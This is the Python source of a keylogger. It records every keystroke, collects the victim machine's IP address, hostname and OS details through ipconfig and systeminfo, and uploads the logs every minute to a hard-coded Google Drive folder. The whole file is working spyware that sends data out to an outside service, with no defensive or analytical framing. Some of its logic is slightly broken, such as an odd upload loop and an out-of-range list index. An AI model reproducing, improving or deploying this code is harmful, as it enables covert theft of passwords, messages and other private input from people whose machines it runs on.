from __future__ import print_function
import keyboard #For Logging Keystrokes
from threading import Timer #Ensures is to make a method run after an 'interval' amount of time
from datetime import datetime #Mark files with datetime timestamp
from Google import Create_Service
from googleapiclient.http import MediaFileUpload
import logging #For Logging INFOs, WARNINGs, ERRORs, CRITICALs, EXCEPTIONs, LOGs
import subprocess #Retriving client info
import regex as re #Sorting out client info

#Initialising Logging Mod
logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)

#Google Create_Service Content
CLIENT_SECRET_FILE = 'client_file_keylogger_frost.json'
API_SERVICE_NAME = 'drive'
API_VERSION = 'v3'
SCOPES = ["https://www.googleapis.com/auth/drive","https://www.googleapis.com/auth/drive.file"]

#Google Drive Folder
folder_id = "1_sPBAhiEwzh45f2Vrea3NUJ7uGUhsUqm"
mime_types = ["text/plain"]
service = Create_Service(CLIENT_SECRET_FILE, API_SERVICE_NAME, API_VERSION, SCOPES)

#Duration To Send Report
SEND_REPORT_EVERY = 60

class keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval #Pass SEND_REPORT_EVERY to "interval" variable
        self.report_method = report_method #Utilizing GoogleDriveApi to upload file
        self.log = "" #Contains the log of all the keystrokes within 'self.interval'
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    #callback func invoked whenever a keyboard event occurs
    def callback(self, event):
        name = event.name

        if len(name) > 1:
            #Not a character, special key (E.g. Ctrl, Alt, Etc)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name #Add key name to global 'self.log' variable
    
    #used to rename filenames to be identified by start & end datestimes
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    #creates a log file in the current directory that contains the current keylogs in the 'self.log' variable
    def report_to_file(self, mime_types, folder_id):
        
        with open(f'{self.filename}.txt', 'w') as f: #opens the file in write mode
                print(self.client_info, file=f) #Writes Info about the Machine
                print(self.log, file=f) #writes the keylogs to file
        print(f"[+] Saved {self.filename}.txt")
        
        for file_name, mime_types in zip(f'{self.filename}.txt', mime_types):
            file_metadata = {
                'name' : f'{self.filename}.txt',
            'parents' : [folder_id]
            }

            media = MediaFileUpload(f'{self.filename}.txt', resumable=True)

            service.files().create(body=file_metadata, media_body=media, fields="id").execute()
            logging.info(f"[*] INFO: %s : {self.filename}", "FILE SUCCESSFULLY UPLOADED")

    #invokes every 'self.interval'. Sends keylogs and reset 'self.log' variable
    def report(self):

        #If there is something in log, report it
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename() #Update filename
            self.report_to_file(mime_types, folder_id)
            #print(f"[{self.filename}] - {self.log}") #If you don't want to print in the console, comment this line
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True #Set thread to daemon (dies when main thread dies)
        timer.start() #Starts the timer

    def start(self):
        client_info = self.retrieve_clientinfo()
        logging.info(f"[*] INFO: %s : {self.client_info}", "KEY LOGGING SERVICE STARTED")
        self.start_dt = datetime.now() #Record start datetime
        keyboard.on_release(callback=self.callback) #Start the keylogger
        self.report() #Start reporting key strokes
        keyboard.wait() #block the current thread, wait until Ctrl + C is pressed

    def retrieve_clientinfo(self):
        #Retrieve Client IP Address
        result_ip = subprocess.Popen(("ipconfig"), stdout=subprocess.PIPE)
        output_ip = subprocess.check_output(('find "IPv4 Address"'), stdin=result_ip.stdout)
        output_ip = output_ip.decode("utf-8")

        result_info = subprocess.run(("systeminfo"), capture_output=True)
        output_info = result_info.stdout.decode("utf-8")

        #Regex Splitting Strings
        output_split = re.split(r":\s((\d{0,3}\S)+)", output_ip) #Client IP
        output_split_info = re.split(r'\r\n+', output_info) #Sys Info
        pattern1_info = re.compile(r'\s+') #Sys Info Pattern

        ip_addr = []
        sys_info = []
        next_i = 1

        #Client IP
        for i in range(0, len(output_split)):
            if (i == next_i):
                ip_addr.append(output_split[i])
                next_i = i + 3

        #Sys Info
        for i in range(0, len(output_split_info)):
            if (("Host Name:" in output_split_info[i]) or ("OS Name:" in output_split_info[i]) or ("OS Version:" in output_split_info[i]) or ("System Type:" in output_split_info[i])):
                output_space = re.sub(pattern1_info, ' ', output_split_info[i])
                sys_info.append(output_space)

        client_ip = ip_addr[-1]
        hostname = sys_info[0]
        os_name = sys_info[1]
        os_version = sys_info[2]
        system_type = sys_info[3]
        bios_version = sys_info[4]

        self.client_info = f"Client IP: {client_ip}, {hostname}, {os_name}, {os_version}, {system_type}, {bios_version}"
        
if __name__ == "__main__":
    keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="email") #Keylogger to send to email
    keylogger.start()
